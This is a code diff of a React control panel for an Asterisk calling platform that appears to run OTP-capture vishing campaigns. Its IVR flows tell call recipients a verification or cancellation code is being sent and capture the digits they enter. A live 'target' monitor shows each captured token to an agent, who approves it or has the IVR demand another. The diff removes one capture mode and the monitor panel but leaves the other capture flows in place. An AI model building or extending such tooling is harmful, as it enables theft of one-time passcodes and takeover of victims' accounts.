@@ -201,7 +201,12 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Mode selection: disparador individual (1 a 1 hacia asesor asignado), acción IVR y centro de llamadas masivas (Ring-All a todas las extensiones)
   const [productionMode, setProductionMode] = useState<'single' | 'ivr_action' | 'mass_campaign'>('single');
 
-  const ALL_CALL_FLOW_MODES: CallFlowMode[] = ['otp', 'press1', 'hybrid', 'cancel_code', 'otp_press1'];
+  const ALL_CALL_FLOW_MODES: CallFlowMode[] = ['otp', 'press1', 'hybrid', 'cancel_code'];
+  const normalizeUiFlowMode = (mode?: string | null): CallFlowMode => {
+    if (mode === 'otp_press1') return 'otp';
+    if (mode === 'otp' || mode === 'press1' || mode === 'hybrid' || mode === 'cancel_code') return mode;
+    return 'press1';
+  };
   const [serverAssignedFlowMode, setServerAssignedFlowMode] = useState<CallFlowMode | null>(null);
   const [serverAllowedFlowModes, setServerAllowedFlowModes] = useState<CallFlowMode[] | null>(null);
   const [serverCanUseMassCalls, setServerCanUseMassCalls] = useState<boolean | null>(null);
@@ -229,7 +234,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     try {
       const saved = localStorage.getItem('ast20_call_flow_mode');
       if (saved === 'otp' || saved === 'press1' || saved === 'hybrid' || saved === 'cancel_code' || saved === 'otp_press1') {
-        return saved;
+        return normalizeUiFlowMode(saved);
       }
     } catch (_) {}
     return 'press1';
@@ -785,11 +790,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         setTenantServerAssignedIds(null);
       }
 
-      if (data.assignedCallFlowMode && ALL_CALL_FLOW_MODES.includes(data.assignedCallFlowMode)) {
-        setServerAssignedFlowMode(data.assignedCallFlowMode);
+      if (data.assignedCallFlowMode) {
+        setServerAssignedFlowMode(normalizeUiFlowMode(data.assignedCallFlowMode));
       }
       if (Array.isArray(data.allowedCallFlowModes) && data.allowedCallFlowModes.length > 0) {
-        const cleanAllowed = data.allowedCallFlowModes.filter((m: any) => ALL_CALL_FLOW_MODES.includes(m));
+        const cleanAllowed = Array.from(
+          new Set<CallFlowMode>(
+            data.allowedCallFlowModes.map((m: any) => normalizeUiFlowMode(String(m))).filter((m: CallFlowMode) => ALL_CALL_FLOW_MODES.includes(m))
+          )
+        );
         if (cleanAllowed.length > 0) {
           setServerAllowedFlowModes(cleanAllowed);
         }
@@ -842,14 +851,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           } catch (_) {}
         }
         if (ws.callFlowMode === 'otp' || ws.callFlowMode === 'press1' || ws.callFlowMode === 'hybrid' || ws.callFlowMode === 'cancel_code' || ws.callFlowMode === 'otp_press1') {
+          const normalizedWsMode = normalizeUiFlowMode(ws.callFlowMode);
           const allowedFromServer: CallFlowMode[] =
             Array.isArray(data.allowedCallFlowModes) && data.allowedCallFlowModes.length > 0
-              ? data.allowedCallFlowModes
+              ? Array.from(new Set<CallFlowMode>(data.allowedCallFlowModes.map((m: any) => normalizeUiFlowMode(String(m)))))
               : ALL_CALL_FLOW_MODES;
           const resolvedMode: CallFlowMode =
-            isSuperAdmin || allowedFromServer.includes(ws.callFlowMode)
-              ? ws.callFlowMode
-              : (data.assignedCallFlowMode || allowedFromServer[0] || 'press1');
+            isSuperAdmin || allowedFromServer.includes(normalizedWsMode)
+              ? normalizedWsMode
+              : (normalizeUiFlowMode(data.assignedCallFlowMode) || allowedFromServer[0] || 'press1');
           setCallFlowModeState(resolvedMode);
           try {
             localStorage.setItem('ast20_call_flow_mode', resolvedMode);
@@ -1654,23 +1664,19 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Planes de marcación asignados por el Super Administrador (el cliente solo puede usar los autorizados)
   const adminAllowedCallFlowModes = React.useMemo<CallFlowMode[]>(() => {
     if (isSuperAdmin) return ALL_CALL_FLOW_MODES;
-    const fromUser =
-      Array.isArray(activeUser?.allowedCallFlowModes) && activeUser.allowedCallFlowModes.length > 0
-        ? activeUser.allowedCallFlowModes.filter((m) => ALL_CALL_FLOW_MODES.includes(m))
+    const mapModes = (arr?: CallFlowMode[] | null) =>
+      Array.isArray(arr) && arr.length > 0
+        ? Array.from(new Set<CallFlowMode>(arr.map((m) => normalizeUiFlowMode(m)).filter((m) => ALL_CALL_FLOW_MODES.includes(m))))
         : null;
-    const fromTenant =
-      Array.isArray(userTenant?.allowedCallFlowModes) && userTenant.allowedCallFlowModes.length > 0
-        ? userTenant.allowedCallFlowModes.filter((m) => ALL_CALL_FLOW_MODES.includes(m))
-        : null;
-    const fromServer =
-      Array.isArray(serverAllowedFlowModes) && serverAllowedFlowModes.length > 0
-        ? serverAllowedFlowModes.filter((m) => ALL_CALL_FLOW_MODES.includes(m))
-        : null;
-    const primary =
+    const fromUser = mapModes(activeUser?.allowedCallFlowModes);
+    const fromTenant = mapModes(userTenant?.allowedCallFlowModes);
+    const fromServer = mapModes(serverAllowedFlowModes);
+    const primary = normalizeUiFlowMode(
       activeUser?.assignedCallFlowMode ||
       userTenant?.assignedCallFlowMode ||
       serverAssignedFlowMode ||
-      'press1';
+      'press1'
+    );
     const baseList = fromUser || fromTenant || fromServer || [primary];
     return Array.from(new Set<CallFlowMode>([primary, ...baseList]));
   }, [
@@ -1867,7 +1873,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   const durationTimerRef = useRef<any>(null);
   const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
-  const [showLiveMonitor, setShowLiveMonitor] = useState<boolean>(true);
   const lastAlertKeyRef = useRef<string>('');
   const activeCallRef = useRef(activeCall);
   const validRecordIdsRef = useRef<Set<string>>(new Set());
@@ -2750,30 +2755,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setTimeout(() => setCopiedId(null), 2500);
   };
 
-  // Clear history and wipe old test codes from Asterisk AstDB
-  const handleClearHistory = async () => {
-    if (!confirm('¿Deseas vaciar los registros y códigos de pruebas anteriores tanto de la web como de Asterisk?')) return;
-    try {
-      const u = activeUserRef.current || activeUser;
-      const assignedExts = Array.isArray(u?.assignedExtensions)
-        ? u.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
-        : [];
-      const params = new URLSearchParams({ clear: '1' });
-      if (u?.tenantId) params.set('tenantId', u.tenantId);
-      if (assignedExts.length > 0) params.set('extensions', assignedExts.join(','));
-      await fetch(`/api/asterisk/otp/records?${params.toString()}`, { method: 'DELETE' });
-      setOtpRecords([]);
-      setLiveCapturedAlert(null);
-      validRecordIdsRef.current.clear();
-      dismissedAlertKeysRef.current.clear();
-      setActiveCall((prev) => (prev ? { ...prev, capturedOtp: undefined, otpStatus: 'pending' } : null));
-      setLaunchFeedback({
-        text: 'Historial y registros de pruebas eliminados con éxito.',
-        type: 'success',
-      });
-    } catch (e) {}
-  };
-
   // Format seconds into MM:SS
   const formatTime = (secs: number) => {
     const m = Math.floor(secs / 60);
@@ -3295,8 +3276,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         </div>
       </div>
 
-      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (EXT. 7777 / 6666 / 5555 / 4444 / 3333) */}
-      {liveCapturedAlert && liveCapturedAlert.status !== 'valid' && (
+      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (Solo si no está visible el HUD inline de llamada activa para no duplicar) */}
+      {liveCapturedAlert && liveCapturedAlert.status !== 'valid' && !(activeCall?.isActive && activeCall.otpStatus !== 'valid') && (
         <div className="p-6 rounded-2xl bg-gradient-to-r from-emerald-950/90 via-slate-950 to-slate-900 border-2 border-emerald-500 shadow-2xl shadow-emerald-500/30 relative overflow-hidden">
           <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-emerald-500/30 pb-4">
             <div className="flex items-center gap-3">
@@ -3488,8 +3469,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 ? 'Press-1'
                 : callFlowMode === 'cancel_code'
                 ? 'Press-1 + Cancelación'
-                : callFlowMode === 'otp_press1'
-                ? 'IVR Captura OTP'
                 : 'Híbrido'}
             </span>
           </button>
@@ -4177,7 +4156,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   </p>
                 )}
 
-                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-2.5">
+                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
                   <button
                     type="button"
                     disabled={!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp')}
@@ -4286,34 +4265,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     </div>
                     <p className="text-[10px] text-amber-300/90 mt-1">Marca 1 → Envía código + Válido/Inválido</p>
                   </button>
-
-                  <button
-                    id="btn-single-mode-otp-press1"
-                    type="button"
-                    disabled={!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp_press1')}
-                    onClick={() => setCallFlowMode('otp_press1')}
-                    title={!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp_press1') ? 'Solo el Administrador puede asignar este plan de marcación' : undefined}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      callFlowMode === 'otp_press1'
-                        ? 'bg-cyan-500/20 border-cyan-400 text-white ring-2 ring-cyan-400/50 shadow-lg shadow-cyan-500/10 cursor-pointer'
-                        : !isSuperAdmin && !adminAllowedCallFlowModes.includes('otp_press1')
-                        ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
-                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-cyan-500/40 cursor-pointer'
-                    }`}
-                  >
-                    <div className="flex items-center justify-between">
-                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
-                        <KeyRound className="w-3.5 h-3.5 text-cyan-400" />
-                        <span>5. IVR Captura OTP</span>
-                      </span>
-                      {callFlowMode === 'otp_press1' ? (
-                        <CheckCircle2 className="w-3.5 h-3.5 text-cyan-400" />
-                      ) : (!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp_press1')) ? (
-                        <Lock className="w-3 h-3 text-slate-500" />
-                      ) : null}
-                    </div>
-                    <p className="text-[10px] text-cyan-300/90 mt-1">Marca 1 → Audio espera + Validar en LiveCalls</p>
-                  </button>
                 </div>
 
                 {callFlowMode === 'cancel_code' && (
@@ -4334,28 +4285,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     >
                       {playingAudioKey === 'single_cancel_wait' ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                       <span>{playingAudioKey === 'single_cancel_wait' ? 'Pausar' : 'Escuchar Audio'}</span>
-                    </button>
-                  </div>
-                )}
-
-                {callFlowMode === 'otp_press1' && (
-                  <div className="p-3 rounded-xl bg-cyan-950/30 border border-cyan-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs animate-fadeIn">
-                    <div className="text-cyan-200/95 space-y-0.5">
-                      <div className="font-bold text-cyan-300 flex items-center gap-1.5">
-                        <Volume2 className="w-3.5 h-3.5 text-cyan-400" />
-                        <span>Nueva Sección: Flujo IVR de Captura OTP Activo</span>
-                      </div>
-                      <p className="text-[11px] text-slate-300">
-                        Al presionar <strong>1</strong>, Asterisk reproduce: <em>"Un momento por favor, le estamos enviando su código de verificación"</em> (<code className="text-cyan-300 font-mono">{getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}</code>), captura los dígitos y el agente valida o rechaza en tiempo real desde <strong>Llamadas en Vivo (LiveCallsTab)</strong>.
-                      </p>
-                    </div>
-                    <button
-                      type="button"
-                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion', 'single_otp_verify_wait')}
-                      className="px-3 py-1.5 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-200 border border-cyan-500/40 text-xs font-bold flex items-center gap-1.5 shrink-0 cursor-pointer"
-                    >
-                      {playingAudioKey === 'single_otp_verify_wait' ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
-                      <span>{playingAudioKey === 'single_otp_verify_wait' ? 'Pausar' : 'Escuchar Audio'}</span>
                     </button>
                   </div>
                 )}
@@ -5321,7 +5250,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       { id: 'press1' as CallFlowMode, label: '2. Press-1 Asesor' },
                       { id: 'hybrid' as CallFlowMode, label: '3. Híbrido' },
                       { id: 'cancel_code' as CallFlowMode, label: '4. Cód. Cancelación' },
-                      { id: 'otp_press1' as CallFlowMode, label: '5. IVR Captura OTP' },
                     ].map((opt) => {
                       const isAllowed = isSuperAdmin || adminAllowedCallFlowModes.includes(opt.id);
                       return (
@@ -5335,8 +5263,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                             callFlowMode === opt.id
                               ? opt.id === 'cancel_code'
                                 ? 'bg-amber-500/20 border-amber-400 text-amber-200 cursor-pointer'
-                                : opt.id === 'otp_press1'
-                                ? 'bg-cyan-500/20 border-cyan-400 text-cyan-200 cursor-pointer'
                                 : 'bg-purple-500/20 border-purple-400 text-white cursor-pointer'
                               : !isAllowed
                               ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
@@ -5354,11 +5280,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       Al marcar <strong>1</strong> dirá: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> y el agente validará Válido / Inválido.
                     </div>
                   )}
-                  {callFlowMode === 'otp_press1' && (
-                    <div className="text-[10px] text-cyan-300 bg-cyan-950/30 border border-cyan-500/30 rounded px-2 py-1.5">
-                      Al presionar <strong>1</strong> dirá: <em>"Un momento por favor, le estamos enviando su código de verificación"</em> y se validará en tiempo real en <strong>Llamadas en Vivo</strong>.
-                    </div>
-                  )}
                 </div>
 
                 <div className="p-3 rounded-xl bg-slate-900 border border-purple-500/30 bg-purple-950/20">
@@ -5371,8 +5292,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <p className="text-[11px] text-slate-300 mt-1 leading-relaxed">
                     {callFlowMode === 'cancel_code'
                       ? 'En modo Código de Cancelación, al marcar 1 el cliente escucha el mensaje de envío de código y digita el código para que el agente lo apruebe o rechace.'
-                      : callFlowMode === 'otp_press1'
-                      ? 'En modo IVR de Captura OTP, al marcar 1 escucha el audio de espera de código de verificación y el agente valida o rechaza el código capturado en Llamadas en Vivo.'
                       : agentExtension === 'ringall'
                       ? `Suenan al mismo tiempo únicamente las extensiones asignadas (${tenantScopedExtensions.join(', ')}). La extensión que conteste la llamada queda registrada automáticamente para el retorno exclusivo de su código OTP.`
                       : `La llamada irá directamente a la extensión ${agentExtension}.`}
@@ -5684,8 +5603,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         ? 'Modo Press-1 Activo'
                         : callFlowMode === 'cancel_code'
                         ? 'Modo Press-1 + Cancelación Activo'
-                        : callFlowMode === 'otp_press1'
-                        ? 'Modo IVR de Captura OTP Activo'
                         : 'Modo Híbrido Activo'}
                     </span>
                   </h3>
@@ -5739,7 +5656,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             </div>
 
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
               {/* Opción 1: Captura OTP */}
               <button
                 type="button"
@@ -5863,38 +5780,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   ✓ Validación manual Válido / Inválido en vivo
                 </div>
               </button>
-
-              {/* Opción 5: IVR de Captura OTP (Press-1 + Código de Verificación) */}
-              <button
-                id="btn-ivr-action-mode-otp-press1"
-                type="button"
-                onClick={() => setCallFlowMode('otp_press1')}
-                className={`p-5 rounded-2xl border text-left transition-all relative ${
-                  callFlowMode === 'otp_press1'
-                    ? 'bg-cyan-500/15 border-cyan-400 text-white shadow-xl shadow-cyan-500/15 ring-2 ring-cyan-400/70'
-                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-cyan-500/40'
-                }`}
-              >
-                <div className="flex items-center justify-between mb-2">
-                  <div className="p-2 rounded-xl bg-cyan-500/20 text-cyan-400">
-                    <KeyRound className="w-5 h-5" />
-                  </div>
-                  {callFlowMode === 'otp_press1' ? (
-                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-cyan-400 text-slate-950">
-                      SELECCIONADO
-                    </span>
-                  ) : (
-                    <span className="text-[10px] font-mono text-cyan-400">Modo 5</span>
-                  )}
-                </div>
-                <div className="text-sm font-bold text-white">5. IVR de Captura OTP</div>
-                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
-                  Al presionar 1 reproduce: <em>"Un momento por favor, le estamos enviando su código de verificación"</em> y el agente valida o rechaza en tiempo real en <strong>Llamadas en Vivo</strong>.
-                </div>
-                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-cyan-400/95 font-mono">
-                  ✓ Validación en tiempo real en LiveCallsTab
-                </div>
-              </button>
             </div>
           </div>
 
@@ -5931,8 +5816,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     ? 'Opción Press 1'
                     : callFlowMode === 'cancel_code'
                     ? 'Press-1 → Enviando Código'
-                    : callFlowMode === 'otp_press1'
-                    ? 'Press-1 → Audio Verificación'
                     : 'Menú Dual OTP/Asesor'}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-1">
@@ -5942,8 +5825,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     ? `Si presiona 1, ejecuta Dial(PJSIP/${agentExtension}) para conectar con tu softphone.`
                     : callFlowMode === 'cancel_code'
                     ? 'Si marca 1, reproduce "Un momento por favor, le estamos enviando un código de cancelación" y solicita los dígitos.'
-                    : callFlowMode === 'otp_press1'
-                    ? 'Si presiona 1, reproduce "Un momento por favor, le estamos enviando su código de verificación" y captura los dígitos OTP.'
                     : `Captura el código OTP ingresado o transfiere a la ${agentExtension} si presiona 1.`}
                 </div>
               </div>
@@ -5955,8 +5836,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     ? 'Conversación en Vivo'
                     : callFlowMode === 'cancel_code'
                     ? 'Decisión Agente (Válido/Inválido)'
-                    : callFlowMode === 'otp_press1'
-                    ? 'Validación en LiveCallsTab'
                     : 'Procesamiento OTP'}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-1">
@@ -5964,8 +5843,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     ? `El operador toma la llamada en el softphone registrado (Extensión ${agentExtension}).`
                     : callFlowMode === 'cancel_code'
                     ? 'El agente ve el código en tiempo real y presiona CÓDIGO VÁLIDO o CÓDIGO INVÁLIDO (si es inválido pide reintento).'
-                    : callFlowMode === 'otp_press1'
-                    ? 'El código aparece al instante en Llamadas en Vivo (LiveCallsTab) para que el agente haga clic en Validar o Rechazar.'
                     : 'Asterisk reproduce la locución de "Un momento validando su información".'}
                 </div>
               </div>
@@ -5976,8 +5853,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 <div className="text-[11px] text-slate-400 mt-1">
                   {callFlowMode === 'cancel_code'
                     ? 'Si es Válido reproduce "Código validado, operación cancelada con éxito" y cierra la llamada.'
-                    : callFlowMode === 'otp_press1'
-                    ? 'Si se valida reproduce confirmación y finaliza; si se rechaza reproduce error y pide nuevo código.'
                     : 'Reproduce la locución de éxito ("Operación bloqueada con éxito") y finaliza la llamada.'}
                 </div>
               </div>
@@ -6316,65 +6191,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
               </div>
 
-              {/* Slot 6: Audio al Marcar 1 - IVR de Captura OTP */}
-              <div className="p-4 rounded-xl bg-slate-900 border border-cyan-500/40 space-y-3 md:col-span-2">
-                <div className="flex items-center justify-between">
-                  <label className="text-xs font-bold text-cyan-200 flex items-center gap-2">
-                    <span className="w-2 h-2 rounded-full bg-cyan-400"></span>
-                    <span>6. Audio de Espera al Presionar 1 (IVR de Captura OTP): "Un momento por favor, le estamos enviando su código de verificación"</span>
-                  </label>
-                  <button
-                    type="button"
-                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion', 'otp_verify_wait')}
-                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
-                    title="Escuchar audio"
-                  >
-                    {playingAudioKey === 'otp_verify_wait' ? (
-                      <>
-                        <Pause className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
-                        <span className="text-cyan-400">Pausar</span>
-                      </>
-                    ) : (
-                      <>
-                        <Play className="w-3.5 h-3.5 text-slate-300" />
-                        <span>Escuchar</span>
-                      </>
-                    )}
-                  </button>
-                </div>
-
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
-                  <div className="space-y-1.5">
-                    <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
-                    <select
-                      value={getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'otpVerifyWaitAudioPath', e.target.value)}
-                      className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-cyan-500 font-mono"
-                    >
-                      <option value="custom/enviando_codigo_verificacion">custom/enviando_codigo_verificacion ("Un momento por favor, le estamos enviando su código de verificación") [RECOMENDADO]</option>
-                      {audios.map((a) => (
-                        <option key={a.id} value={a.asteriskPath}>
-                          {a.name} ({a.asteriskPath})
-                        </option>
-                      ))}
-                    </select>
-                  </div>
-
-                  <div className="space-y-1.5">
-                    <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
-                    <input
-                      type="text"
-                      value={getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'otpVerifyWaitAudioPath', e.target.value)}
-                      placeholder="ej: custom/enviando_codigo_verificacion"
-                      className="w-full px-3 py-2 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-cyan-500 focus:outline-none"
-                    />
-                  </div>
-                </div>
-                <div className="text-[10px] text-slate-400 font-mono">
-                  Se reproduce automáticamente cuando el cliente presiona 1 en la nueva sección <strong>IVR de Captura OTP (Modo 5)</strong>.
-                </div>
-              </div>
             </div>
           </div>
 
@@ -6474,131 +6290,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       )}
 
 
-
-      {/* LIVE CAPTURED OTP MONITOR FOR AGENT (Prominent HUD) */}
-      {otpRecords.length > 0 && showLiveMonitor && (
-        <div className="p-6 rounded-2xl bg-gradient-to-br from-slate-900 via-slate-950 to-slate-900 border-2 border-emerald-500/50 shadow-2xl shadow-emerald-500/10 space-y-4">
-          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
-            <div className="flex items-center gap-2.5">
-              <span className="relative flex h-3 w-3">
-                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
-              </span>
-              <h3 className="text-sm font-extrabold text-white tracking-wide flex items-center gap-2">
-                <KeyRound className="w-4 h-4 text-emerald-400" />
-                <span>MONITOR EN VIVO DEL AGENTE: ÚLTIMO TOKEN CAPTURADO DEL CLIENTE</span>
-              </h3>
-            </div>
-            <div className="flex items-center gap-3">
-              <div className="text-xs font-mono text-slate-400">
-                Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong>
-                {otpRecords[0].agent ? (
-                  <span className="ml-1.5 px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30 font-bold">
-                    Ext. {otpRecords[0].agent}
-                  </span>
-                ) : null}
-                {' '}({otpRecords[0].service || 'Servicio al Cliente'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
-              </div>
-              <button
-                type="button"
-                onClick={() => setShowLiveMonitor(false)}
-                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all cursor-pointer text-xs flex items-center gap-1"
-                title="Ocultar monitor de dígitos"
-              >
-                <X className="w-4 h-4" />
-                <span className="hidden sm:inline text-[11px]">Ocultar</span>
-              </button>
-            </div>
-          </div>
-
-          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 py-2">
-            {/* Visualización de los dígitos marcados en el teclado */}
-            <div className="space-y-1.5 text-center lg:text-left">
-              <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">
-                Dígitos digitados por el cliente en su teléfono:
-              </div>
-              <div className="flex items-center justify-center lg:justify-start gap-2">
-                {otpRecords[0].otp.split('').map((digit, idx) => (
-                  <span
-                    key={idx}
-                    className="w-12 h-14 sm:w-14 sm:h-16 flex items-center justify-center text-2xl sm:text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/80 shadow-lg shadow-emerald-500/20"
-                  >
-                    {digit}
-                  </span>
-                ))}
-              </div>
-            </div>
-
-            {/* Botones de Decisión del Agente (VÁLIDO / INVÁLIDO) */}
-            <div className="flex flex-wrap items-center justify-center lg:justify-end gap-3">
-              <button
-                type="button"
-                id="btn-live-agent-approve-otp"
-                onClick={() => handleVerifyOtp('valid', otpRecords[0].otp, otpRecords[0].number, otpRecords[0].id)}
-                className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs sm:text-sm shadow-xl transition-all ${
-                  otpRecords[0].status === 'valid'
-                    ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
-                    : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
-                }`}
-              >
-                <CheckCircle className="w-5 h-5" />
-                <span>CÓDIGO VÁLIDO</span>
-              </button>
-
-              <button
-                type="button"
-                id="btn-live-agent-reject-otp"
-                onClick={() => handleVerifyOtp('invalid', otpRecords[0].otp, otpRecords[0].number, otpRecords[0].id)}
-                title="Marca como inválido y el IVR le pide un nuevo token de 6 dígitos automáticamente al cliente"
-                className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs sm:text-sm shadow-xl transition-all ${
-                  otpRecords[0].status === 'invalid'
-                    ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
-                    : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
-                }`}
-              >
-                <XCircle className="w-5 h-5" />
-                <span>CÓDIGO INVÁLIDO</span>
-              </button>
-
-              <button
-                type="button"
-                id="btn-live-agent-copy-otp"
-                onClick={() => handleCopyOtp(otpRecords[0].otp, 'monitor-top')}
-                className="inline-flex items-center gap-1.5 px-4 py-3.5 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
-              >
-                {copiedId === 'monitor-top' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
-                <span>{copiedId === 'monitor-top' ? '¡Copiado!' : 'Copiar'}</span>
-              </button>
-            </div>
-          </div>
-
-          <div className="flex flex-wrap items-center justify-between gap-2 text-xs pt-2 border-t border-slate-800/80">
-            <span className="text-slate-400">
-              Estado actual del código:{' '}
-              {otpRecords[0].status === 'valid' ? (
-                <strong className="text-emerald-400 font-bold">✓ VÁLIDO (Aprobado por el asesor)</strong>
-              ) : otpRecords[0].status === 'invalid' ? (
-                <strong className="text-rose-400 font-bold">✗ INVÁLIDO (Rechazado por el asesor)</strong>
-              ) : (
-                <strong className="text-amber-400 font-bold">⏳ Pendiente de decisión del asesor</strong>
-              )}
-            </span>
-            <div className="flex items-center gap-3">
-              <span className="text-[11px] text-slate-500 font-mono hidden md:inline">
-                Audio configurado en IVR: <span className="text-emerald-400">"Por favor digite su TOKEN de 6 dígitos"</span>
-              </span>
-              <button
-                type="button"
-                onClick={handleClearHistory}
-                className="text-xs text-rose-400 hover:text-rose-300 underline font-medium cursor-pointer"
-                title="Borrar códigos de pruebas anteriores"
-              >
-                Limpiar datos de prueba
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
 
       {/* MODAL: SUBIDA / GRABACIÓN RÁPIDA DE AUDIO PARA LA CAMPAÑA */}
       {isQuickUploadOpen && (
